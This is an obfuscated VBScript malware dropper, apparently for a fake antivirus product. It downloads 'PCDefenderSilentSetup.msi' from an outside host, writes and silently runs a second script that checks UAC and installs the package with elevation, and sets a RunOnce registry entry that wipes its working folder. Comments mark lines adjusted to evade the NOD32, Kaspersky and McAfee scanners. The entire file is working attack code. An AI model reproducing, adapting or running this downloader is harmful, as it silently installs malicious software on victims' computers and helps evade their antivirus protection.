Dim IobFCKH61RH95R74re67yrJq0, yPgee54DIr5MrJAZqgX6kr61
wC9PWGEmWfCEVaoykVmMts02 = "" & D43Q8 & "\" & ehLsf4Ndl5GCS86TV2F ' <- NOD32
Set IobFCKH61RH95R74re67yrJq0 = CreateObject("Scripting.FileSystemObject")
Set yPgee54DIr5MrJAZqgX6kr61 = IobFCKH61RH95R74re67yrJq0.CreateFolder(wC9PWGEmWfCEVaoykVmMts02)

Os145oj7mn5EoesT25M02ZE4c = "http://kaksosatblog.info/PCDefenderSilentSetup.msi"
Z7p4G3 = "" & ehLsf4Ndl5GCS86TV2F & ".msi"
iw1a578 Os145oj7mn5EoesT25M02ZE4c, wC9PWGEmWfCEVaoykVmMts02, Z7p4G3 ' <- KIS

wSZ51qv0s = "Dim w03EFfzm4kAl190Hvr11sUE2k, G2Cmv0, CUw1y3JdN1S8S2tKY2O, Twff7y67g0NhIE44M2990vPO8, aTjv98p, YIFH6kp83YTy8BvQxWe8oJMn" & vbCr & vbLf & _
    "Set w03EFfzm4kAl190Hvr11sUE2k = CreateObject(""WScript.Shell"")" & vbCr & vbLf & _
    "G2Cmv0 = w03EFfzm4kAl190Hvr11sUE2k.ExpandEnvironmentStrings(""%OS%"")" & vbCr & vbLf & _
    "If G2Cmv0 = ""Windows_NT"" Then" & vbCr & vbLf & _
    "   CUw1y3JdN1S8S2tKY2O = ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\""" & vbCr & vbLf & _
    "   Twff7y67g0NhIE44M2990vPO8 = w03EFfzm4kAl190Hvr11sUE2k.regread(CUw1y3JdN1S8S2tKY2O & ""CurrentVersion"")" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
    "  CUw1y3JdN1S8S2tKY2O = ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\""" & vbCr & vbLf & _
    "  Twff7y67g0NhIE44M2990vPO8 = w03EFfzm4kAl190Hvr11sUE2k.regread(CUw1y3JdN1S8S2tKY2O & ""VersionNumber"")" & vbCr & vbLf & _
    "End if" & vbCr & vbLf & _
    "Twff7y67g0NhIE44M2990vPO8 = Mid(Twff7y67g0NhIE44M2990vPO8,1,1)" & vbCr & vbLf & _
    "If (Twff7y67g0NhIE44M2990vPO8 = 6) Then" & vbCr & vbLf & _
    "   aTjv98p = ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\""" & vbCr & vbLf & _
    "   YIFH6kp83YTy8BvQxWe8oJMn = w03EFfzm4kAl190Hvr11sUE2k.regread(aTjv98p & ""EnableLUA"")" & vbCr & vbLf & _
    "End If" & vbCr & vbLf & _
    "Set w03EFfzm4kAl190Hvr11sUE2k = Nothing" & vbCr & vbLf & _
    "Set w03EFfzm4kAl190Hvr11sUE2k = CreateObject(""Shell.Application"")" & vbCr & vbLf & _
	"If ((Twff7y67g0NhIE44M2990vPO8 = 6) AND (YIFH6kp83YTy8BvQxWe8oJMn = 1)) Then" & vbCr & vbLf & _
	"   w03EFfzm4kAl190Hvr11sUE2k.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&Z7p4G3&""" & Chr(34) & "" /quiet"", """", ""runas"", 1" & vbCr & vbLf & _
    "   Set w03EFfzm4kAl190Hvr11sUE2k = Nothing" & vbCr & vbLf & _
    "Else" & vbCr & vbLf & _
	"   w03EFfzm4kAl190Hvr11sUE2k.ShellExecute ""msiexec"", "" /i "" & Chr(34) & """&Z7p4G3&""" & Chr(34) & "" /quiet"", """", ""open"", 1" & vbCr & vbLf & _
    "   Set w03EFfzm4kAl190Hvr11sUE2k = Nothing" & vbCr & vbLf & _
    "End If"
dhahcBuk24KRBHyAJ = wC9PWGEmWfCEVaoykVmMts02 & "\" & ehLsf4Ndl5GCS86TV2F & ".vbs"
Set ppke72YJJP22 = IobFCKH61RH95R74re67yrJq0.OpenTextFile(dhahcBuk24KRBHyAJ, 8, True)
ppke72YJJP22.WriteLine(wSZ51qv0s)
ppke72YJJP22.Close

dim QyL4eSo32
set QyL4eSo32 = CreateObject("Shell.Application")
QyL4eSo32.ShellExecute "wscript", """" & dhahcBuk24KRBHyAJ & """", "", "open", 0 ' <- McAfee
set QyL4eSo32 = nothing

t6SMn8b wC9PWGEmWfCEVaoykVmMts02


Function iw1a578(yECfmX5530e17EuRvl3g, J0XVqzf8QXIFWzpW2, x1Tg6m8z18kqdU89)
   Dim jcvBpt4Cx57l9t48, MBlgg6l
   
   yECfmX5530e17EuRvl3g = Replace(yECfmX5530e17EuRvl3g,"\","/")

   'If len(x1Tg6m8z18kqdU89) = 0 Then ' <- KIS
   '   Exit Function 
   'End If

   Set jcvBpt4Cx57l9t48 = CREATEOBJECT("Microsoft.XMLHTTP") 
   jcvBpt4Cx57l9t48.open "GET", yECfmX5530e17EuRvl3g, "False" 

   jcvBpt4Cx57l9t48.send 
   If jcvBpt4Cx57l9t48.statustext = "OK" Then 
      Set MBlgg6l = CreateObject("ADODB.Stream") 
      MBlgg6l.type = 1 
      MBlgg6l.Open 
      MBlgg6l.Write jcvBpt4Cx57l9t48.responseBody 

      if len(J0XVqzf8QXIFWzpW2) > 0 Then x1Tg6m8z18kqdU89 = J0XVqzf8QXIFWzpW2 & "\" & x1Tg6m8z18kqdU89 
      MBlgg6l.SaveToFile x1Tg6m8z18kqdU89, 2 
      MBlgg6l.Close 
      Set MBlgg6l = Nothing 
      iw1a578 = 1
   End if 
   Set jcvBpt4Cx57l9t48 = Nothing
End Function


Function ehLsf4Ndl5GCS86TV2F
	h11W5JNzkZkXjB97I0IkDpDTS = 14
	aMIYAUmQ6xe6Lx00nP5S50 = 7

	Randomize  
	xhFgQP33T3b = Int(((h11W5JNzkZkXjB97I0IkDpDTS - aMIYAUmQ6xe6Lx00nP5S50 + 1) * Rnd) _
	    + h11W5JNzkZkXjB97I0IkDpDTS)  

	h11W5JNzkZkXjB97I0IkDpDTS = 90
	aMIYAUmQ6xe6Lx00nP5S50 = 65
	
	For i = 1 to xhFgQP33T3b
	    Randomize
	    rM51ps06N42Grg403yKt3Qi = Int(((h11W5JNzkZkXjB97I0IkDpDTS - aMIYAUmQ6xe6Lx00nP5S50 + 1) * Rnd) _
	        + aMIYAUmQ6xe6Lx00nP5S50)  
	    h42P16B2 = h42P16B2 & Chr(rM51ps06N42Grg403yKt3Qi)
	Next
	
	ehLsf4Ndl5GCS86TV2F = h42P16B2
End Function


Function D43Q8
	Set c66ec3xYDY89LAy34Cs4 = Wscript.CreateObject("Wscript.Shell")
	D43Q8 = c66ec3xYDY89LAy34Cs4.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal")
End Function


Function t6SMn8b(VClXoaJ53ItupPP8)
	Set a7nYyVV9t5y32255YTArly38 = Wscript.CreateObject("Wscript.Shell")
	a7nYyVV9t5y32255YTArly38.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\delpcdefmsi", "cmd /c rmdir /s /q """ & VClXoaJ53ItupPP8 & """", "REG_SZ"
End Function
